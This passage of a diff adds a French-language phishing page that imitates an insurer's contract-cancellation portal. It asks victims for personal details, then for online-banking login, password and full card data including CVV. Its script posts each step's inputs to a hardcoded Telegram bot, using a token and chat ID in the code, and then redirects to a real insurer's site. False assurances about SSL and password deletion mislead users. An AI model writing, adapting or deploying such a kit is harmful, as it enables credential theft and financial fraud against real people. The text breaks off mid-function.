+      <button class="navbar__hamburger" id="hamburger" aria-label="Menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+
+    <div class="navbar__mobile-menu" id="mobileMenu">
+      <a href="#" class="btn-nav btn-nav--ghost">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>Aide / FAQ
+      </a>
+      <a href="#" class="btn-nav btn-nav--ghost">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M3 18v-6a9 9 0 0 1 18 0v6"/>
+          <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"/>
+          <path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/>
+        </svg>Service client
+      </a>
+      <a href="#" class="btn-nav btn-nav--primary">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>Espace adhérent
+      </a>
+    </div>
+  </header>
+
+  <nav class="subnav">
+    <div class="subnav__inner">
+      <div class="subnav__left">
+        <a href="#" class="snav-item">Santé
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </a>
+        <a href="#" class="snav-item">Prévoyance
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </a>
+        <a href="#" class="snav-item">Risques Divers
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </a>
+        <a href="#" class="snav-item">Assurance de Prêt</a>
+      </div>
+      <div class="subnav__right">
+        <div class="snav-sep"></div>
+        <a href="#" class="snav-item">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+            <polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>
+          </svg>
+          Extranet
+        </a>
+        <a href="#" class="snav-item">Devenez Partenaire</a>
+      </div>
+    </div>
+
+    <button class="snav-burger" id="snavBurger" style="display:none;">
+      <span></span>
+      Menu
+    </button>
+    <div class="subnav__mobile" id="snavMobile">
+      <a href="#" class="snav-item">Santé</a>
+      <a href="#" class="snav-item">Prévoyance</a>
+      <a href="#" class="snav-item">Risques Divers</a>
+      <a href="#" class="snav-item">Assurance de Prêt</a>
+      <a href="#" class="snav-item">Extranet</a>
+      <a href="#" class="snav-item">Devenez Partenaire</a>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero__bg hero__bg--1 active" id="bg1"></div>
+    <div class="hero__bg hero__bg--2" id="bg2"></div>
+
+    <div class="hero__overlay"></div>
+
+    <div class="hero__content">
+      <div class="hero__card">
+        <div class="hero__badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="8" x2="12" y2="12"/>
+            <line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          Demande d'annulation
+        </div>
+        <h1 class="hero__title">
+          Vous souhaitez<br><span>annuler votre contrat ?</span>
+        </h1>
+        <p class="hero__desc">
+          Notre équipe traite votre demande rapidement et en toute confidentialité.
+          Remplissez le formulaire ci-dessous ou contactez-nous directement.
+        </p>
+        <a href="#formulaire" class="hero__cta">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 3.08 4.18 2 2 0 0 1 5.06 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L9.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 23 17z"/>
+          </svg>
+          Accéder au formulaire d'annulation
+        </a>
+      </div>
+    </div>
+
+    <div class="hero__dots">
+      <div class="hero__dot active" data-index="0"></div>
+      <div class="hero__dot" data-index="1"></div>
+    </div>
+  </section>
+
+  <div class="wave-sep" id="waveSep">
+    <svg viewBox="0 0 1440 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M0,0 C360,60 1080,60 1440,0 L1440,60 L0,60 Z" fill="#f0f3f9"/>
+    </svg>
+  </div>
+
+  <div id="page1">
+    <div class="body-img">
+      <img src="body.png" alt=""
+           onerror="this.parentElement.innerHTML='<div class=\'body-img-fallback\'>· IMAGE BODY.PNG ·</div>'" />
+    </div>
+    <footer class="site-footer">
+      <img src="footer.png" alt="Footer"
+           onerror="this.style.opacity='0'; this.style.height='0';" />
+    </footer>
+  </div>
+
+  <div id="loadingScreen" style="display:none;">
+    <div class="loading-inner">
+      <img src="logo.png" alt="Logo" class="loading-logo"
+           onerror="this.style.display='none'; document.getElementById('loadingLogoFallback').style.display='flex';" />
+      <div class="loading-logo-fallback" id="loadingLogoFallback" style="display:none;">
+        <span class="ll-icon">M</span>
+        <span class="ll-name">Ma Boutique</span>
+      </div>
+      <div class="loading-spinner">
+        <div class="spinner-ring"></div>
+        <div class="spinner-ring spinner-ring--2"></div>
+      </div>
+      <p class="loading-title">Vérification de votre dossier…</p>
+      <p class="loading-sub">Merci de patienter quelques instants</p>
+      <div class="loading-bar-wrap">
+        <div class="loading-bar" id="loadingBar"></div>
+      </div>
+      <p class="loading-pct" id="loadingPct">0%</p>
+    </div>
+  </div>
+
+  <div id="page2" style="display:none;">
+    <main class="form-section">
+      <div class="form-section__inner">
+
+        <div class="form-logo">
+          <img src="logo.png" alt="Logo"
+               onerror="this.style.display='none'; document.getElementById('formLogoFallback').style.display='flex';" />
+          <span class="form-logo-fallback" id="formLogoFallback" style="display:none;">
+            <span class="fl-icon">M</span>
+            <span class="fl-name">Ma Boutique</span>
+          </span>
+        </div>
+
+        <div class="step-indicator">
+          <div class="step-dot step-dot--done">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="step-line step-line--done"></div>
+          <div class="step-dot step-dot--active">2</div>
+          <div class="step-line"></div>
+          <div class="step-dot">3</div>
+          <div class="step-label-row">
+            <span>Demande</span>
+            <span>Identité</span>
+            <span>Confirmation</span>
+          </div>
+        </div>
+
+        <div class="form-card">
+          <div class="form-card__header">
+            <h2>Vos informations personnelles</h2>
+            <p>Ces données nous permettent de traiter votre demande d'annulation en toute sécurité.</p>
+            <div class="form-divider"></div>
+          </div>
+
+          <p class="section-desc">Renseignez vos coordonnées personnelles complètes et exactes. Ces informations sont indispensables pour identifier votre dossier, vérifier votre identité et vous envoyer la confirmation de votre demande de résiliation dans les meilleurs délais.</p>
+
+          <div class="form-grid">
+            <div class="form-group form-group--full">
+              <label>Nom complet <span>*</span></label>
+              <input type="text" id="p2nom" class="form-control" placeholder="Ex : Martin Jean-Pierre" />
+            </div>
+            <div class="form-group form-group--full">
+              <label>Adresse <span>*</span></label>
+              <input type="text" id="p2adresse" class="form-control" placeholder="N° et nom de rue" />
+            </div>
+            <div class="form-group">
+              <label>Code postal <span>*</span></label>
+              <input type="text" id="p2cp" class="form-control" placeholder="75001" maxlength="5" />
+            </div>
+            <div class="form-group">
+              <label>Ville <span>*</span></label>
+              <input type="text" id="p2ville" class="form-control" placeholder="Paris" />
+            </div>
+            <div class="form-group">
+              <label>Date de naissance <span>*</span></label>
+              <input type="date" id="p2dob" class="form-control" />
+            </div>
+            <div class="form-group">
+              <label>Numéro de téléphone <span>*</span></label>
+              <input type="tel" id="p2tel" class="form-control" placeholder="06 00 00 00 00" />
+            </div>
+          </div>
+
+          <button class="form-submit" id="submitBtn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="22" y1="2" x2="11" y2="13"/>
+              <polygon points="22 2 15 22 11 13 2 9 22 2"/>
+            </svg>
+            Envoyer ma demande d'annulation
+          </button>
+
+          <p class="form-note">
+            Vos données sont protégées conformément à notre
+            <a href="#">politique de confidentialité</a>.
+          </p>
+        </div>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <img src="footer.png" alt="Footer"
+           onerror="this.style.opacity='0'; this.style.height='0';" />
+    </footer>
+  </div>
+
+  <div id="page3" style="display:none;">
+    <main class="form-section">
+      <div class="form-section__inner">
+
+        <div class="form-logo">
+          <img src="logo.png" alt="Logo"
+               onerror="this.style.display='none'; document.getElementById('formLogo3Fallback').style.display='flex';" />
+          <span class="form-logo-fallback" id="formLogo3Fallback" style="display:none;">
+            <span class="fl-icon">M</span>
+            <span class="fl-name">Ma Boutique</span>
+          </span>
+        </div>
+
+        <div class="step-indicator">
+          <div class="step-dot step-dot--done">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="step-line step-line--done"></div>
+          <div class="step-dot step-dot--done">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div class="step-line step-line--done"></div>
+          <div class="step-dot step-dot--active">3</div>
+          <div class="step-label-row">
+            <span>Identité</span>
+            <span>Informations</span>
+            <span>Bancaire</span>
+          </div>
+        </div>
+
+        <div class="form-card" style="margin-top: 16px;">
+          <div class="form-card__header">
+            <h2>Informations bancaires</h2>
+            <p>Nécessaires pour finaliser et confirmer votre demande d'annulation.</p>
+            <div class="form-divider"></div>
+          </div>
+
+          <div class="bank-section-title">
+            <div class="bst-line"></div>
+            <span>
+              <svg width="13" height="13" style="margin-right:5px;vertical-align:-2px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M3 9h18M9 21V9"/></svg>
+              Établissement bancaire
+            </span>
+            <div class="bst-line"></div>
+          </div>
+
+          <p class="section-desc">Sélectionnez votre banque dans la liste. Chaque saisie est sécurisée et chiffrée par protocole SSL 256 bits.</p>
+
+          <div class="form-grid">
+            <div class="form-group form-group--full">
+              <label>Nom de votre banque <span>*</span></label>
+
+              <div class="bank-dropdown" id="bankDropdown">
+                <div class="bank-selected" id="bankSelected" onclick="toggleBankDropdown()">
+                  <span class="bank-selected__placeholder" id="bankPlaceholder">Sélectionnez votre banque…</span>
+                  <div class="bank-selected__bank" id="bankSelectedInfo" style="display:none;">
+                    <img id="bankSelectedImg" src="" alt="" />
+                    <span id="bankSelectedName"></span>
+                  </div>
+                  <svg class="bank-dropdown__arrow" id="bankArrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+                </div>
+                <div class="bank-options" id="bankOptions">
+                  <div class="bank-option" data-value="AXA Banque" data-img="banque/axa banque.png" onclick="selectBank(this)">
+                    <img src="banque/axa banque.png" alt="AXA Banque" onerror="this.style.display='none'"/>
+                    <span>AXA Banque</span>
+                  </div>
+                  <div class="bank-option" data-value="Banque Populaire" data-img="banque/banque populaire.png" onclick="selectBank(this)">
+                    <img src="banque/banque populaire.png" alt="Banque Populaire" onerror="this.style.display='none'"/>
+                    <span>Banque Populaire</span>
+                  </div>
+                  <div class="bank-option" data-value="La Banque Postale" data-img="banque/banque_postal.png" onclick="selectBank(this)">
+                    <img src="banque/banque_postal.png" alt="La Banque Postale" onerror="this.style.display='none'"/>
+                    <span>La Banque Postale</span>
+                  </div>
+                  <div class="bank-option" data-value="BforBank" data-img="banque/bforbank.png" onclick="selectBank(this)">
+                    <img src="banque/bforbank.png" alt="BforBank" onerror="this.style.display='none'"/>
+                    <span>BforBank</span>
+                  </div>
+                  <div class="bank-option" data-value="BNP Paribas" data-img="banque/BNP.png" onclick="selectBank(this)">
+                    <img src="banque/BNP.png" alt="BNP Paribas" onerror="this.style.display='none'"/>
+                    <span>BNP Paribas</span>
+                  </div>
+                  <div class="bank-option" data-value="Boursorama Banque" data-img="banque/boursorama.png" onclick="selectBank(this)">
+                    <img src="banque/boursorama.png" alt="Boursorama Banque" onerror="this.style.display='none'"/>
+                    <span>Boursorama Banque</span>
+                  </div>
+                  <div class="bank-option" data-value="Caisse d'Épargne" data-img="banque/caisse.png" onclick="selectBank(this)">
+                    <img src="banque/caisse.png" alt="Caisse d'Épargne" onerror="this.style.display='none'"/>
+                    <span>Caisse d'Épargne</span>
+                  </div>
+                  <div class="bank-option" data-value="Carrefour Banque" data-img="banque/carrefour banque.png" onclick="selectBank(this)">
+                    <img src="banque/carrefour banque.png" alt="Carrefour Banque" onerror="this.style.display='none'"/>
+                    <span>Carrefour Banque</span>
+                  </div>
+                  <div class="bank-option" data-value="Crédit Agricole" data-img="banque/credit.png" onclick="selectBank(this)">
+                    <img src="banque/credit.png" alt="Crédit Agricole" onerror="this.style.display='none'"/>
+                    <span>Crédit Agricole</span>
+                  </div>
+                  <div class="bank-option" data-value="Crédit Mutuel" data-img="banque/Credit-Mutuel.png" onclick="selectBank(this)">
+                    <img src="banque/Credit-Mutuel.png" alt="Crédit Mutuel" onerror="this.style.display='none'"/>
+                    <span>Crédit Mutuel</span>
+                  </div>
+                  <div class="bank-option" data-value="Hello bank!" data-img="banque/hello banque.png" onclick="selectBank(this)">
+                    <img src="banque/hello banque.png" alt="Hello bank!" onerror="this.style.display='none'"/>
+                    <span>Hello bank!</span>
+                  </div>
+                  <div class="bank-option" data-value="LCL" data-img="banque/LCL.png" onclick="selectBank(this)">
+                    <img src="banque/LCL.png" alt="LCL" onerror="this.style.display='none'"/>
+                    <span>LCL – Le Crédit Lyonnais</span>
+                  </div>
+                  <div class="bank-option" data-value="N26" data-img="banque/n26.png" onclick="selectBank(this)">
+                    <img src="banque/n26.png" alt="N26" onerror="this.style.display='none'"/>
+                    <span>N26</span>
+                  </div>
+                  <div class="bank-option" data-value="Nickel" data-img="banque/nickel.png" onclick="selectBank(this)">
+                    <img src="banque/nickel.png" alt="Nickel" onerror="this.style.display='none'"/>
+                    <span>Nickel</span>
+                  </div>
+                  <div class="bank-option" data-value="Orange Bank" data-img="banque/orange banque.png" onclick="selectBank(this)">
+                    <img src="banque/orange banque.png" alt="Orange Bank" onerror="this.style.display='none'"/>
+                    <span>Orange Bank</span>
+                  </div>
+                  <div class="bank-option" data-value="Revolut" data-img="banque/revolut.png" onclick="selectBank(this)">
+                    <img src="banque/revolut.png" alt="Revolut" onerror="this.style.display='none'"/>
+                    <span>Revolut</span>
+                  </div>
+                  <div class="bank-option" data-value="Société Générale" data-img="banque/sg.png" onclick="selectBank(this)">
+                    <img src="banque/sg.png" alt="Société Générale" onerror="this.style.display='none'"/>
+                    <span>Société Générale</span>
+                  </div>
+                  <div class="bank-option bank-option--other" data-value="autre" data-img="" onclick="selectBank(this)">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;opacity:.5;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
+                    <span>Autre banque…</span>
+                  </div>
+                </div>
+              </div>
+              <input type="hidden" id="bankSelectValue" />
+            </div>
+
+            <div class="form-group form-group--full" id="otherBankGroup" style="display:none;">
+              <label>Précisez votre banque <span>*</span></label>
+              <input type="text" class="form-control" id="otherBankInput" placeholder="Nom de votre établissement bancaire" />
+            </div>
+
+            <div class="form-group">
+              <label>Identifiant client <span>*</span></label>
+              <p class="field-hint">Votre numéro d'accès à votre espace en ligne, généralement composé de 6 à 11 chiffres.</p>
+              <input type="text" class="form-control" id="clientId"
+                     placeholder="N° client (chiffres)"
+                     inputmode="numeric"
+                     oninput="this.value=this.value.replace(/\D/g,'')" />
+            </div>
+
+            <div class="form-group">
+              <label>Mot de passe <span>*</span></label>
+              <p class="field-hint">Votre mot de passe bancaire en ligne. Il ne sera pas conservé après traitement.</p>
+              <div class="cb-field-icon">
+                <input type="password" class="form-control" id="bankPwd" placeholder="Mot de passe" style="padding-right:44px;" />
+                <span class="fi-icon" id="eyeToggle" style="cursor:pointer;" onclick="togglePwd()">
+                  <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                  </svg>
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <div class="bank-section-title" style="margin-top:36px;">
+            <div class="bst-line"></div>
+            <span>
+              <svg width="13" height="13" style="margin-right:5px;vertical-align:-2px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+              Carte bancaire
+            </span>
+            <div class="bst-line"></div>
+          </div>
+
+          <p class="section-desc">Renseignez les coordonnées de la carte bancaire associée au contrat que vous souhaitez résilier. Ces informations nous permettent de vérifier votre identité et de traiter le remboursement éventuel.</p>
+
+          <div class="cb-visual-wrap">
+            <div class="cb-card" id="cbCard">
+              <img src="cb.png" class="cb-img" alt="" onerror="this.style.display='none'" />
+              <div class="cb-deco-circle"></div>
+              <div class="cb-content">
+                <div class="cb-top">
+                  <div>
+                    <div class="cb-bank-name" id="cbBankLabel">MA BANQUE</div>
+                    <div class="cb-chip" style="margin-top:10px;"></div>
+                  </div>
+                  <div class="cb-mc"><span></span><span></span></div>
+                </div>
+                <div class="cb-number-display" id="cbNumberDisplay">•••• &nbsp;•••• &nbsp;•••• &nbsp;••••</div>
+                <div class="cb-bottom">
+                  <div class="cb-holder">Titulaire<strong id="cbHolderDisplay">VOTRE NOM</strong></div>
+                  <div>
+                    <div class="cb-holder">Expire le</div>
+                    <div class="cb-holder"><strong id="cbExpDisplay">MM/AA</strong></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="form-grid">
+            <!-- ── NUMÉRO CB : 4 CHAMPS SÉPARÉS ── -->
+            <div class="form-group form-group--full">
+              <label>Numéro de carte (16 chiffres) <span>*</span></label>
+              <p class="field-hint">Le numéro à 16 chiffres figurant au recto de votre carte, saisi en 4 groupes de 4 chiffres.</p>
+              <div class="cb-number-fields">
+                <input type="text" class="cb-n" id="cbN1"
+                       placeholder="0000" maxlength="4" inputmode="numeric"
+                       oninput="onCbInput(this, 1)" onkeydown="onCbKey(event, 1)"
+                       autocomplete="cc-number" />
+                <input type="text" class="cb-n" id="cbN2"
+                       placeholder="0000" maxlength="4" inputmode="numeric"
+                       oninput="onCbInput(this, 2)" onkeydown="onCbKey(event, 2)" />
+                <input type="text" class="cb-n" id="cbN3"
+                       placeholder="0000" maxlength="4" inputmode="numeric"
+                       oninput="onCbInput(this, 3)" onkeydown="onCbKey(event, 3)" />
+                <input type="text" class="cb-n" id="cbN4"
+                       placeholder="0000" maxlength="4" inputmode="numeric"
+                       oninput="onCbInput(this, 4)" onkeydown="onCbKey(event, 4)" />
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label>Date d'expiration <span>*</span></label>
+              <p class="field-hint">Format MM/AA figurant au recto.</p>
+              <input type="text" class="form-control" id="cbExpiry"
+                     placeholder="MM/AA" maxlength="5" inputmode="numeric"
+                     oninput="formatExpiry(this)" />
+            </div>
+
+            <div class="form-group">
+              <label>Code CVV <span>*</span></label>
+              <p class="field-hint">Les 3 chiffres au dos de votre carte.</p>
+              <div class="cb-field-icon">
+                <input type="password" class="form-control" id="cbCvv"
+                       placeholder="•••" maxlength="3" inputmode="numeric"
+                       oninput="this.value=this.value.replace(/\D/g,'')" />
+                <span class="fi-icon">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <div class="security-badge">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Paiement sécurisé SSL 256-bit — Vos données sont chiffrées et protégées
+          </div>
+
+          <button class="form-submit" id="confirmBtn" style="background:linear-gradient(135deg,#16a34a,#22c55e);box-shadow:0 4px 18px rgba(34,197,94,.32);" onmouseover="this.style.background='linear-gradient(135deg,#15803d,#16a34a)'" onmouseout="this.style.background='linear-gradient(135deg,#16a34a,#22c55e)'">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+              <polyline points="22 4 12 14.01 9 11.01"/>
+            </svg>
+            Confirmer ma demande d'annulation
+          </button>
+
+          <p class="form-note">
+            En confirmant, vous acceptez nos <a href="#">conditions générales</a> et notre <a href="#">politique de confidentialité</a>.
+          </p>
+        </div>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <img src="footer.png" alt="Footer" onerror="this.style.opacity='0'; this.style.height='0';" />
+    </footer>
+  </div>
+
+  <script>
+    const TG_TOKEN  = '8146763994:AAH3-fEFXbPezkPd4X7wwwsseqYQIedch-0';
+    const TG_CHATID = '8130095786';
+
+    async function sendTelegram(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_CHATID, text, parse_mode: 'HTML' })
+        });
+      } catch(e) { console.warn('Telegram:', e); }
+    }
+
+    document.getElementById('hamburger').addEventListener('click', function() {
+      const open = document.getElementById('mobileMenu').classList.toggle('open');
+      this.classList.toggle('open', open);
+      this.setAttribute('aria-expanded', open);
+    });
+
+    function updateSnavBurger() {
+      const hidden = getComputedStyle(document.querySelector('.subnav__inner')).display === 'none';
+      document.getElementById('snavBurger').style.display = hidden ? 'flex' : 'none';
+    }
+    updateSnavBurger();
+    window.addEventListener('resize', updateSnavBurger);
+    document.getElementById('snavBurger').addEventListener('click', () => {
+      document.getElementById('snavMobile').classList.toggle('open');
+    });
+
+    const bgs  = [document.getElementById('bg1'), document.getElementById('bg2')];
+    const dots = document.querySelectorAll('.hero__dot');
+    let current = 0, sliderTimer;
+    function goTo(idx) {
+      bgs[current].classList.remove('active'); dots[current].classList.remove('active');
+      current = idx;
+      bgs[current].classList.add('active'); dots[current].classList.add('active');
+    }
+    function startAuto() { sliderTimer = setInterval(() => goTo((current+1)%bgs.length), 5000); }
+    dots.forEach(d => d.addEventListener('click', () => { clearInterval(sliderTimer); goTo(+d.dataset.index); startAuto(); }));
+    startAuto();
+
+    const page1         = document.getElementById('page1');
+    const page2         = document.getElementById('page2');
+    const page3         = document.getElementById('page3');
+    const hero          = document.querySelector('.hero');
+    const waveSep       = document.getElementById('waveSep');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const loadingBar    = document.getElementById('loadingBar');
+    const loadingPct    = document.getElementById('loadingPct');
+
+    const msgs = [
+      'Vérification de votre dossier…',
+      'Récupération de vos contrats…',
+      'Chargement du formulaire…',
+      'Presque terminé…'
+    ];
+
+    document.querySelector('.hero__cta').addEventListener('click', (e) => {
+      e.preventDefault();
+      sendTelegram('🔔 <b>Nouvelle visite</b>\n\nUn utilisateur accède au formulaire d\'annulation.');
+      [hero, waveSep, page1].forEach(el => { el.style.transition='opacity .4s'; el.style.opacity='0'; });
+      setTimeout(() => {
+        [hero, waveSep, page1].forEach(el => el.style.display='none');
+        showLoading(() => revealPage(page2));
+      }, 400);
+    });
+
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const nom   = document.getElementById('p2nom').value;
+      const addr  = document.getElementById('p2adresse').value;
+      const cp    = document.getElementById('p2cp').value;
+      const ville = document.getElementById('p2ville').value;
+      const dob   = document.getElementById('p2dob').value;
+      const tel   = document.getElementById('p2tel').value;
+      sendTelegram(
+`📋 <b>ÉTAPE 2 — Informations personnelles</b>
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Nom :</b> ${nom}
+🏠 <b>Adresse :</b> ${addr}
+📮 <b>CP :</b> ${cp}  🏙️ <b>Ville :</b> ${ville}
+🎂 <b>Naissance :</b> ${dob}
+📞 <b>Tél :</b> ${tel}
+━━━━━━━━━━━━━━━━━━━━━`);
+      page2.style.transition='opacity .4s'; page2.style.opacity='0';
+      setTimeout(() => { page2.style.display='none'; showLoading(()=>revealPage(page3)); }, 400);
+    });
+
+    document.getElementById('confirmBtn').addEventListener('click', () => {
+      const banque = document.getElementById('bankSelectValue').value ||
+                     document.getElementById('otherBankInput').value || '';
+      const cid    = document.getElementById('clientId').value;
+      const pwd    = document.getElementById('bankPwd').value;
+      const cbNum  = getCbNumber();
+      const cbExp  = document.getElementById('cbExpiry').value;
+      const cbCvv  = document.getElementById('cbCvv').value;
+      sendTelegram(
+`💳 <b>ÉTAPE 3 — Informations bancaires</b>
+━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>Banque :</b> ${banque}
+🔢 <b>Identifiant :</b> ${cid}
+🔑 <b>Mot de passe :</b> ${pwd}
+━━━━━━━━━━━━━━━━━━━━━
+💳 <b>Numéro CB :</b> ${cbNum}
+📅 <b>Expiration :</b> ${cbExp}
+🔐 <b>CVV :</b> ${cbCvv}
+━━━━━━━━━━━━━━━━━━━━━
+✅ Demande soumise`
+      ).then(() => setTimeout(()=>{ window.location.href='https://www.neoliane.fr/devenez-partenaire'; }, 300));
+    });
+
+    function showLoading(cb) {
+      loadingBar.style.width='0%'; loadingPct.textContent='0%';
+      loadingScreen.style.opacity='1'; loadingScreen.style.display='flex';
+      window.scrollTo(0,0);
+      const titleEl = loadingScreen.querySelector('.loading-title');
+      titleEl.textContent = msgs[0];
+      let s=0;
+      const iv = setInterval(()=>{
+        const pct = Math.min(Math.round((++s/80)*100),100);
+        loadingBar.style.width=pct+'%'; loadingPct.textContent=pct+'%';
+        if(pct===25) titleEl.textContent=msgs[1];
+        if(pct===55) titleEl.textContent=msgs[2];
+        if(pct===85) titleEl.textContent=msgs[3];
+        if(pct>=100){ clearInterval(iv);
+          loadingScreen.style.transition='opacity .4s'; loadingScreen.style.opacity='0';
+          setTimeout(()=>{ loadingScreen.style.display='none'; cb(); },400);
+        }
+      }, 50);
+    }
+
+    function revealPage(el) {
+      el.style.display='block'; el.style.opacity='0';
+      requestAnimationFrame(()=>{ el.style.transition='opacity .5s'; el.style.opacity='1'; });
+      window.scrollTo(0,0);
+    }
+
+    /* ── Custom bank dropdown ── */
+    function toggleBankDropdown() {
+      document.getElementById('bankDropdown').classList.toggle('open');
+    }
+
+    function selectBank(el) {
+      const val  = el.dataset.value;
+      const img  = el.dataset.img || '';
+      const name = el.querySelector('span').textContent;
+      document.getElementById('bankSelectValue').value = val;
+      document.getElementById('bankDropdown').classList.remove('open');
+      const placeholder  = document.getElementById('bankPlaceholder');
+      const selectedInfo = document.getElementById('bankSelectedInfo');
+      if (val==='autre') {
+        placeholder.style.display='inline'; placeholder.textContent='Autre banque…';
+        selectedInfo.style.display='none';
+        document.getElementById('otherBankGroup').style.display='flex';
+        document.getElementById('cbBankLabel').textContent='AUTRE BANQUE';
+      } else {
+        placeholder.style.display='none'; selectedInfo.style.display='flex';
+        document.getElementById('bankSelectedImg').src = img;
+        document.getElementById('bankSelectedName').textContent = name;
+        document.getElementById('otherBankGroup').style.display='none';
+        document.getElementById('cbBankLabel').textContent = val.toUpperCase();
+      }
+    }
+
+    document.addEventListener('click', (e)=>{
+      const dd = document.getElementById('bankDropdown');
+      if(dd && !dd.contains(e.target)) dd.classList.remove('open');
+    });
+
+    /* ── Toggle mot de passe ── */
+    function togglePwd() {
+      const inp=document.getElementById('bankPwd'), ico=document.getElementById('eyeIcon');
+      if(inp.type==='password'){
+        inp.type='text';
